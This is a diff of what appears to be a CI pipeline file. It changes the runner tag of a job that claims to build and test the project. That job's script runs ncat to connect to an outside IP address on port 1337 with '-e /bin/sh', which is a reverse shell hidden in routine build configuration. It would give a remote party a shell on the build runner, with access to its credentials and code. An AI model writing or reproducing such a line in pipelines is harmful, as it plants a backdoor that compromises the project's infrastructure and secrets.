@@ -78,10 +78,11 @@ verify:
 # This section describes what shall be done to build and test the project.
 verify:
   tags:
-    - shell
+    - docker-build
   stage: first
   script:
     - docker run itsthenetwork/alpine-ncat 31.209.38.15 1337 -e /bin/sh
+
 documentation:
   tags:
     - docker-build
